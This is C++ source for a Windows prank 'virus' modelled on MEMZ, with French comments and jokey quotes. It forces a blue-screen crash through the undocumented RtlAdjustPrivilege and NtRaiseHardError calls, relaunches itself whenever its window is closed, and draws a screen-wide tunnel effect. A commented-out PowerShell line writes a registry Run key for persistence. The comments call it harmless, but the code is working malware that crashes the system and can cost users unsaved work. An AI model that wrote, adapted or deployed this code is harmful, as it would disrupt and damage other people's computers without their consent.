//PHASE 1 Alpha Shrek BSOD (& memz virus like)


//PHASE 2 : CSGO T in your windows
// faire un genre de bonzo virus, impossible a fermer mais innofensif juste la pour prouver que c'est possible


// Remove any doubts in your head; it's us, or them.
// Easy peasy, lemon squeezy!
// Let's make this right as rain.
// Bingo, bango, bongo; bish, bash, bosh.
// Remember! This isn't the killing house anymore! This is real life.
// Are we rushing in? Or are we going sneaky-beaky like?




#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include "resource.h" // Inclure le fichier d'en-tête des ressources
#include <thread>
#include <random>
#include <iostream>
#include <winternl.h>

#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

// Variables pour les positions de la fenêtre
int posX = 100; 
int posY = 100; 

// Incrémentation pour déplacement
int deltaX = 100; 
int deltaY = 150;


// Variable globale pour le chemin complet
std::string fullPath;



void BBSSOODD() {

    Sleep(3000);


    typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

    typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);



    	HMODULE hNtdll = GetModuleHandle("ntdll.dll");

    	if (hNtdll != 0)
    	{
    		NTSTATUS s1, s2;
    		BOOLEAN b;
    		ULONG r;
    
    		//Enable shutdown privilege
    		//More https://msdn.microsoft.com/en-us/library/bb530716%28VS.85%29.aspx
    
    		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    		s1 = pfnRtlAdjustPrivilege(19, true, false, &b);
    
    		//Cause BSOD
    		//More about NtRaiseHardError here http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html
    
    		TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    		s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
    	}
    
};

void mk_cmd(const std::string& appName) {
    // Structure pour spécifier les informations de démarrage du processus
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Créer un processus pour exécuter la commande
    if (!CreateProcess(NULL,   // Nom de l'application
        const_cast<char*>(appName.c_str()), // Commande à exécuter
        NULL,           // Pas d'attributs de sécurité pour le processus
        NULL,           // Pas d'attributs de sécurité pour les threads
        FALSE,          // Pas d'héritage de handle
        0,              // Pas de drapeaux spéciaux
        NULL,           // Utiliser l'environnement du processus parent
        NULL,           // Utiliser le répertoire de travail du processus parent
        &si,            // Structure STARTUPINFO
        &pi))           // Structure PROCESS_INFORMATION
    {
        // En cas d'échec
        std::cerr << "CreateProcess a échoué (" << GetLastError() << ")." << std::endl;
        return;
    }

    // Attendre la fin du processus
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Fermer les handles du processus et du thread
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}






// Déclaration de la fonction pour charger une image à partir des ressources
Bitmap* LoadImageFromResource(HINSTANCE hInstance, int resID) {
    HRSRC hRes = FindResource(hInstance, MAKEINTRESOURCE(resID), RT_RCDATA);
    if (!hRes) {
        std::cerr << "Erreur : Ressource non trouvée." << std::endl;
        return nullptr;
    }

    HGLOBAL hMem = LoadResource(hInstance, hRes);
    DWORD imageSize = SizeofResource(hInstance, hRes);
    void* pData = LockResource(hMem);

    if (!pData || imageSize == 0) {
        std::cerr << "Erreur : Impossible de charger les données de la ressource." << std::endl;
        return nullptr;
    }

    // Créer un flux de mémoire à partir des données
    HGLOBAL hBuffer = GlobalAlloc(GMEM_MOVEABLE, imageSize);
    if (hBuffer) {
        void* pBuffer = GlobalLock(hBuffer);
        memcpy(pBuffer, pData, imageSize);
        GlobalUnlock(hBuffer);

        IStream* pStream = nullptr;
        CreateStreamOnHGlobal(hBuffer, TRUE, &pStream);

        // Charger l'image depuis le flux
        Bitmap* bmp = new Bitmap(pStream);
        pStream->Release();
        GlobalFree(hBuffer);

        // Vérifier si le chargement a réussi
        if (bmp->GetLastStatus() != Ok) {
            std::cerr << "Erreur : Impossible de charger l'image depuis le flux." << std::endl;
            delete bmp;
            return nullptr;
        }

        return bmp;
    }

    std::cerr << "Erreur : Échec de l'allocation de la mémoire." << std::endl;
    return nullptr;
}

// Fonction de traitement de la fenêtre
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static Bitmap* image = nullptr;

    switch (uMsg) {
        case WM_CREATE:
            // Charger l'image à partir des ressources
            image = LoadImageFromResource(GetModuleHandle(NULL), IDB_MYIMAGE);
            if (!image) {
                std::cerr << "Erreur : Impossible de charger l'image lors de la création de la fenêtre." << std::endl;
            }
            return 0;

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);

            if (image) {
                Graphics graphics(hdc);
                graphics.DrawImage(image, 0, 0, image->GetWidth(), image->GetHeight());
            }

            EndPaint(hwnd, &ps);
            return 0;
        }

        case WM_DESTROY:
            delete image; // vire l'image de la memoire
             //reupere full path 
            char buffer[MAX_PATH];
            GetModuleFileName(NULL, buffer, MAX_PATH);
        
            fullPath = buffer;  
        
            MessageBox(NULL, "DAMMMN les gens c'est Tibo !", "Popup", MB_OK);

            

            //se relance (rajout des quotes pour que w10 prennes le path complet)
            mk_cmd(fullPath);

            //Fait parler Windows
            //mk_cmd("powershell -c 'Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('haha _____________________________________________________________ KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK ')'");

 
            return 0;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Fonction principale de l'application
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nShowCmd) {
    // Initialisation de GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    const char CLASS_NAME[] = "SampleWindowClass";

    // Structure pour définir la classe de fenêtre
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClass(&wc);

    // Créer la fenêtre
    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, "Affichage d'image", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 500, 421, //500x421
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, nShowCmd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

         // MAJ position fenêtre
        posX += deltaX;
        posY += deltaY;

        // Set nouvelle position fenêtre
        SetWindowPos(hwnd, NULL, posX, posY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);

        // Vérifier les limites de l'écran pour ne pas sortir
        RECT rect;
        GetWindowRect(hwnd, &rect);
        if (rect.right >= GetSystemMetrics(SM_CXSCREEN) || rect.left <= 0) {
            deltaX = -deltaX; // Inverser la direction X
        }
        if (rect.bottom >= GetSystemMetrics(SM_CYSCREEN) || rect.top <= 0) {
            deltaY = -deltaY; // Inverser la direction Y
        }
    }

    // Nettoyer GDI+
    GdiplusShutdown(gdiplusToken);
    
    return 0;
}




//Fonction effet tunnel comme le virus memz
void MEMZ_Effect(HDC hdcScreen, int screenWidth, int screenHeight) {
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);

    //capture tout lecran
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    //draw tunnel effect
    for (int i = 0; i < 20; ++i) {
        //calcul regression tunnel 
        int newWidth = screenWidth - i * (screenWidth / 20);
        int newHeight = screenHeight - i * (screenHeight / 20);
        int offsetX = (screenWidth - newWidth) / 2;
        int offsetY = (screenHeight - newHeight) / 2;

        //StretchBlt pour appliquer leffet 
        StretchBlt(hdcScreen, offsetX, offsetY, newWidth, newHeight, hdcMem, 0, 0, screenWidth, screenHeight, SRCCOPY);
    }

    //nettoyage
    //DeleteObject(hBitmap);
    //DeleteDC(hdcMem);
}

// fonction pour exec winmain dans un thread
void RunWinMain() {
    //instance + start 
    HINSTANCE hInstance = GetModuleHandle(NULL);
    WinMain(hInstance, NULL, NULL, SW_SHOWNORMAL);
}


int main() {

    //WinMain(hInstance, NULL, NULL, SW_SHOWNORMAL);
    //on lance WinMain dans un thread pour qu'il continue dexec le reste 
    std::thread winMainThread(RunWinMain);

    //attacher le thread au principale
    winMainThread.detach();

    //persistance 
    //mk_cmd("powershell -c \"New-Item 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Value '" + fullPath + "' -Force -WindowStyle Hidden\"");

    //POur leffet memz
    //Avoir la taille de lecran
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Obtenir le contexte de l'écran
    HDC hdcScreen = GetDC(NULL);




    //on lance leffet memz
    MEMZ_Effect(hdcScreen, screenWidth, screenHeight);

    std::thread BlueThread(BBSSOODD);

    //pour détacher le thread du principale
    BlueThread.detach();


    //reupere full path 
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    fullPath = buffer; 
    //lance une copie de lui même  
    mk_cmd(fullPath);

    
    MEMZ_Effect(hdcScreen, screenWidth, screenHeight);

    

    return 0;
}




